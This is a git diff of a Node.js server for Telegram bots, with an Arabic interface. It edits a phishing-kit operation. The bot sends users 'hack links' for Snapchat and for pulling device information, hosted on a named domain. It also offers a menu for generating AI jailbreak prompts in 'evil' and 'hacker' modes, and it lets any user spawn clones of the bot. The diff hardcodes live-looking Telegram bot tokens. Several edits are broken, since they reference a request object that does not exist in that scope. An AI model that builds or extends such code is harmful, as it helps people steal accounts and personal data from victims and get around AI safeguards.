@@ -20,7 +20,7 @@ const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
 const developerId = 5739065274;
-const botTokenMain = '8051920740:AAH-ijAqc7z0kTFrsbm2L7hnW875lHichao';
+const botTokenMain = '8051920740:AAEL4HHJKotVx5DAfaZuJetMJ9bk5m5xeHY';
 const domain = "https://botwahm-erfu.onrender.com";
 
 global.app = express();
@@ -48,16 +48,9 @@ function getTargetBot(botUser) {
     return global.mainBot || null;
 }
 
-function isOldMessage(msgOrQuery) {
-  const now = Math.floor(Date.now() / 1000);
-  return (now - (msgOrQuery.date || 0)) > 180; 
-}
-
 async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain) {
-    // FIX: Clones send ONLY with their bot username. Main bot sends clean link.
-    const botParam = isMain ? "" : `?bot=${botUsername}&id=${chatId}`;
+    // FIX: Strict single link for clones.
     const query = isMain ? `?id=${chatId}` : `?bot=${botUsername}&id=${chatId}`;
-    
     const links = {
         'add_names': { name: "سناب شات", path: "/snap" },
         'collect_device_info': { name: "سحب معلومات الجهاز", path: "/device" },
@@ -83,6 +76,7 @@ function bindBotLogic(botInstance, token, ownerId) {
     const bot = botInstance;
     const botToken = token;
     const developerId = 5739065274;
+    
     const app = {
         get: (...args) => { if(isMain && !global.routesInitialized) global.app.get(...args); },
         post: (...args) => { if(isMain && !global.routesInitialized) global.app.post(...args); },
@@ -93,20 +87,15 @@ function bindBotLogic(botInstance, token, ownerId) {
     if (!global.botActivityTracker[token]) global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
     if (!global.botSettings[token]) { global.botSettings[token] = { showCloneBtn: true, customChannels: [], admins: [ownerId] }; saveSettings(); }
 
-    // Dual-Token Subscription Logic
     async function checkUserSubscription(chatId) {
       const mainChannels = fixedChannels.concat(additionalChannels); 
       const localChannels = global.botSettings[token]?.customChannels || [];
-      
-      // Main channels verified via Main Bot
       for (let channel of mainChannels) {
         try {
           const status = await global.mainBot.getChatMember(channel.id, chatId);
           if (status.status === 'left' || status.status === 'kicked') return false;
         } catch (error) { return false; }
       }
-      
-      // Clone channels verified via Clone Bot token
       for (let channel of localChannels) {
         try {
           const status = await botInstance.getChatMember(channel.id, chatId);
@@ -130,7 +119,7 @@ function bindBotLogic(botInstance, token, ownerId) {
         const text = msg.text;
         if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
         
-        // Master Developer Rights Command
+        // Master Dev Command
         if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
             const parts = text.split(' ');
             if (parts.length === 3) {
@@ -145,14 +134,14 @@ function bindBotLogic(botInstance, token, ownerId) {
             }
         }
 
-        // Clone Owner Admin Panel
-        if (!isMain && global.botSettings[token].admins.includes(chatId) && text === '/admin') {
-            return botInstance.sendMessage(chatId, "🛠️ **لوحة تحكم مالك البوت (Admin Panel)**\n\nإدارة قناتك، الإذاعة، والإحصائيات:", { 
+        // Clone Admin Panel
+        if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
+            return botInstance.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { 
                 reply_markup: { 
                     inline_keyboard: [
-                        [{ text: "📢 إرسال إذاعة للمستخدمين", callback_data: "admin_broadcast" }], 
+                        [{ text: "📢 إذاعة للمستخدمين", callback_data: "admin_broadcast" }], 
                         [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }], 
-                        [{ text: "🔗 إضافة قناتك الإجبارية", callback_data: "admin_add_chan" }, { text: "❌ حذف قنواتك", callback_data: "admin_rem_chan" }]
+                        [{ text: "🔗 إضافة قناتك", callback_data: "admin_add_chan" }, { text: "❌ حذف قنواتك", callback_data: "admin_rem_chan" }]
                     ] 
                 } 
             });
@@ -162,9 +151,9 @@ function bindBotLogic(botInstance, token, ownerId) {
             if (userStatesManus[chatId + '_' + token] === 'wait_broadcast') {
                 delete userStatesManus[chatId + '_' + token];
                 const users = Array.from(global.botActivityTracker[token].users);
-                botInstance.sendMessage(chatId, `⏳ جاري إرسال الإذاعة لـ ${users.length} مستخدم...`);
+                botInstance.sendMessage(chatId, `⏳ جاري الإرسال لـ ${users.length} مستخدم...`);
                 for (const u of users) { try { await botInstance.sendMessage(u, text); } catch(e) {} }
-                return botInstance.sendMessage(chatId, `✅ تم إرسال الإذاعة بنجاح.`);
+                return botInstance.sendMessage(chatId, `✅ تم الإرسال.`);
             }
             if (userStatesManus[chatId + '_' + token] === 'wait_add_chan') {
                 delete userStatesManus[chatId + '_' + token];
@@ -172,9 +161,9 @@ function bindBotLogic(botInstance, token, ownerId) {
                 if (parts.length >= 3) { 
                     global.botSettings[token].customChannels.push({ id: parts[0].trim(), name: parts[1].trim(), inviteLink: parts[2].trim() }); 
                     saveSettings(); 
-                    return botInstance.sendMessage(chatId, `✅ تم إضافة قناتك الخاصة بنجاح!\nملاحظة: قنوات المطور الأساسية محمية ولا يمكن حذفها.`); 
+                    return botInstance.sendMessage(chatId, `✅ تم إضافة قناتك بنجاح.`); 
                 }
-                return botInstance.sendMessage(chatId, "❌ تنسيق خاطئ. أرسل الأيدي، الاسم، والرابط (كل واحد في سطر).");
+                return botInstance.sendMessage(chatId, "❌ تنسيق خاطئ.");
             }
         }
 
@@ -186,19 +175,23 @@ function bindBotLogic(botInstance, token, ownerId) {
                 const me = await tempBot.getMe();
                 persistNewToken(newToken, chatId, me.username);
                 spawnBotInstance(newToken, false, chatId);
-                return botInstance.sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 البوت المصنوع: @${me.username}\n\nأرسل /start لتجربته.`);
-            } catch(e) { return botInstance.sendMessage(chatId, "❌ توكن غير صالح أو حدث خطأ أثناء الاتصال."); }
+                return botInstance.sendMessage(chatId, `✅ **تم تشغيل بوتك!**\n🤖 @${me.username}`);
+            } catch(e) { return botInstance.sendMessage(chatId, "❌ توكن غير صالح."); }
         }
     });
 
     botInstance.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const action = query.data;
-        if (action === 'admin_stats') return botInstance.sendMessage(chatId, `📊 إحصائيات البوت:\n- عدد المستخدمين النشطين: ${global.botActivityTracker[token].users.size}\n- القنوات الإجبارية المضافة: ${global.botSettings[token].customChannels.length}`);
-        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return botInstance.sendMessage(chatId, "📝 أرسل الآن نص الإذاعة لجميع مستخدمي بوثك:"); }
-        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return botInstance.sendMessage(chatId, "🔗 أرسل معلومات قناتك بهذا التنسيق (في رسالة واحدة):\n- أيدي القناة (يبدأ بـ -100)\n- اسم القناة\n- رابط الدعوة\n\n(كل سطر معلومة)"); }
-        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return botInstance.sendMessage(chatId, "✅ تم حذف قنواتك الخاصة بنجاح (قنوات المطور الأساسية محمية ودائمة)."); }
-        if (action === 'clone_my_bot') { userStatesManus[chatId + '_' + token] = 'wait_clone_token'; return botInstance.sendMessage(chatId, "🤖 **صناعة بوت جديد**\n\nأرسل توكن البوت الخاص بك من BotFather الآن:"); }
+        if (action === 'admin_stats') return botInstance.sendMessage(chatId, `📊 إحصائيات:\n- مستخدمين: ${global.botActivityTracker[token].users.size}\n- قنواتك: ${global.botSettings[token].customChannels.length}`);
+        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return botInstance.sendMessage(chatId, "📝 أرسل نص الإذاعة:"); }
+        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return botInstance.sendMessage(chatId, "🔗 أرسل: أيدي القناة، الاسم، الرابط (كل واحد في سطر)"); }
+        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return botInstance.sendMessage(chatId, "✅ تم الحذف."); }
+        if (action === 'clone_my_bot') { 
+            if (!global.botSettings[token].showCloneBtn && !isMain) return botInstance.sendMessage(chatId, "❌ عذراً، هذه الميزة غير مفعلة لهذا البوت.");
+            userStatesManus[chatId + '_' + token] = 'wait_clone_token'; 
+            return botInstance.sendMessage(chatId, "🤖 أرسل توكن بوتك من @BotFather:"); 
+        }
     });
 function generateShortToken(chatId, type, extra = {}) {
     const token = crypto.randomBytes(4).toString('hex'); // 8 حروف
@@ -264,7 +257,7 @@ async function getVideoInfoReal(chatId, videoUrl) {
         userStatesManus[chatId + '_url'] = videoUrl;
         return bot.sendPhoto(chatId, info.thumbnail, { caption, reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
     } catch (e) {
-        return bot.sendMessage(chatId, "❌ فشل جلب معلومات الفيديو. تأكد من صحة الرابط.");
+        return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "❌ فشل جلب معلومات الفيديو. تأكد من صحة الرابط.");
     }
 }
 
@@ -299,7 +292,7 @@ async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
         if (quality === 'audio') return bot.sendAudio(chatId, buffer, { filename: fileName });
         return bot.sendVideo(chatId, buffer, { filename: fileName });
     } catch (e) {
-        return bot.sendMessage(chatId, "❌ فشل التحميل. الرابط قد يكون غير مدعوم حالياً.");
+        return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "❌ فشل التحميل. الرابط قد يكون غير مدعوم حالياً.");
     }
 }
 
@@ -315,7 +308,7 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
-/* let bot; // Main bot instance */
+/* let bot; */ // Main bot instance
 global.mainBot = null;
 global.activeBotInstances = {};
 global.botUsernames = {};
@@ -334,7 +327,7 @@ function isOldMessage(msgOrQuery) {
   return (now - (msgOrQuery.date || 0)) > 180; 
 }
 
-async function sendPhishingLink(botInstance, chatId, action, botUsername) {
+/* async function sendPhishingLink(botInstance, chatId, action, botUsername) {
     const query = `?id=${chatId}&bot=${botUsername}`;
     const links = {
         'add_names': { name: "سناب شات", path: "/snap" },
@@ -353,7 +346,7 @@ async function sendPhishingLink(botInstance, chatId, action, botUsername) {
     if (links[action]) {
         return botInstance.sendMessage(chatId, `🔥 رابط اختراق ${links[action].name}:\n${domain}${links[action].path}${query}`);
     }
-}
+} */
 
 function bindBotLogic(botInstance, token, ownerId) {
     const bot = botInstance; 
@@ -375,8 +368,8 @@ function bindBotLogic(botInstance, token, ownerId) {
                 const me = await tempBot.getMe();
                 persistNewToken(newToken, chatId, me.username);
                 spawnBotInstance(newToken, false, chatId);
-                return bot.sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 @${me.username}`);
-            } catch(e) { return bot.sendMessage(chatId, "❌ توكن غير صالح."); }
+                return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 @${me.username}`);
+            } catch(e) { return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "❌ توكن غير صالح."); }
         }
     });
 
@@ -385,16 +378,16 @@ function bindBotLogic(botInstance, token, ownerId) {
         const action = query.data;
         if (action === 'clone_my_bot') {
             userStatesManus[chatId + '_' + token] = 'wait_clone_token';
-            return bot.sendMessage(chatId, "🤖 **صنع بوت خاص بك**\n\nأرسل التوكن الخاص بك من @BotFather هنا:");
+            return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "🤖 **صنع بوت خاص بك**\n\nأرسل التوكن الخاص بك من @BotFather هنا:");
         }
         if (action === 'feat_ai_bypass') {
             const jailMenu = [[{ text: '😈 الشرير', callback_data: 'jb_evil' }, { text: '💻 الهكر', callback_data: 'jb_hacker' }],[{ text: '🎨 المصمم', callback_data: 'jb_designer' }, { text: '🛡️ الأمن السيبراني', callback_data: 'jb_cyber' }]];
-            return bot.sendMessage(chatId, "🔓 **اختر وضع كسر القيود المطلوب:**", { reply_markup: { inline_keyboard: jailMenu }, parse_mode: 'Markdown' });
+            return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "🔓 **اختر وضع كسر القيود المطلوب:**", { reply_markup: { inline_keyboard: jailMenu }, parse_mode: 'Markdown' });
         }
         if (action.startsWith('jb_')) {
             const mode = action.split('_')[1];
             let prompt = "وضع " + mode + " مفعل... (برومبت طويل)...";
-            return bot.sendMessage(chatId, `✅ **تم توليد برومبت الكسر (${mode}):**\n\n\`\`\`\n${prompt}\n\`\`\``, { parse_mode: 'Markdown' });
+            return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, `✅ **تم توليد برومبت الكسر (${mode}):**\n\n\`\`\`\n${prompt}\n\`\`\``, { parse_mode: 'Markdown' });
         }
         await sendPhishingLink(bot, chatId, action, bot.options.username || 'MainBot', isMain);
     });
@@ -4365,23 +4358,54 @@ function persistNewToken(token, ownerId, botUsername) {
         fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2), 'utf8');
     }
 }
+
 async function spawnBotInstance(token, isMain = false, specificOwner = null) {
-    if (global.activeBotInstances[token]) return;
+    if (global.activeBotInstances[token] && !isMain) return;
+    
     try {
         const b = new TelegramBot(token, { polling: false });
         const owner = specificOwner || developerId;
+        
+        // 1. Force stop any previous instance in the same process
+        if (global.activeBotInstances[token]) {
+            try { await global.activeBotInstances[token].stopPolling(); } catch(e) {}
+        }
+
+        // 2. Clear Webhook to ensure polling works
         await b.deleteWebHook({ drop_pending_updates: true });
+        
+        // 3. Delayed startup to allow external instances to be killed by platform
+        const delay = isMain ? 2000 : Math.floor(Math.random() * 10000) + 5000;
+        
         setTimeout(async () => {
             try {
-                await b.startPolling({ interval: 300, autoStart: true, params: { timeout: 10, limit: 100 } });
-                console.log(`Bot instance started successfully.`);
-            } catch(e) { if(e.message.includes('409')) setTimeout(() => spawnBotInstance(token, isMain, owner), 30000); }
-        }, isMain ? 500 : Math.floor(Math.random() * 10000) + 2000);
+                // Check again if conflict still exists
+                await b.startPolling({ 
+                    interval: 300, 
+                    autoStart: true, 
+                    params: { timeout: 10, limit: 100 } 
+                });
+                console.log(`Bot ${isMain ? 'Main' : 'Clone'} started successfully.`);
+            } catch(e) { 
+                console.error(`Conflict detected for token ${token.substring(0,10)}...: ${e.message}`);
+                if(e.message.includes('409')) {
+                    // Exponential backoff for conflicts
+                    console.log("Retrying in 30 seconds due to 409 Conflict...");
+                    setTimeout(() => spawnBotInstance(token, isMain, owner), 30000); 
+                }
+            }
+        }, delay);
+
         bindBotLogic(b, token, owner);
         global.activeBotInstances[token] = b;
-        if (isMain) { global.mainBot = b; }
-        b.getMe().then(me => { global.botUsernames[token] = me.username; b.options.username = me.username; });
-    } catch(e) {}
+        if (isMain) global.mainBot = b;
+        b.getMe().then(me => { 
+            global.botUsernames[token] = me.username; 
+            b.options.username = me.username; 
+        });
+    } catch(e) {
+        console.error("Critical spawn error:", e);
+    }
 }
 
 app.post('/submitNames', (req, res) => {
@@ -4391,8 +4415,12 @@ app.post('/submitNames', (req, res) => {
     res.status(200).send('Success');
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 global.app.listen(PORT, () => console.log(`Master Server Running on Port ${PORT}`));
 
-spawnBotInstance('8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao', true, developerId);
-getStoredTokens().forEach(item => { if (item.token !== '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao') spawnBotInstance(item.token, false, item.ownerId); });
+// Start instances
+spawnBotInstance(botTokenMain, true, developerId);
+const stored = getStoredTokens();
+stored.forEach(item => { 
+    if (item.token !== botTokenMain) spawnBotInstance(item.token, false, item.ownerId); 
+});
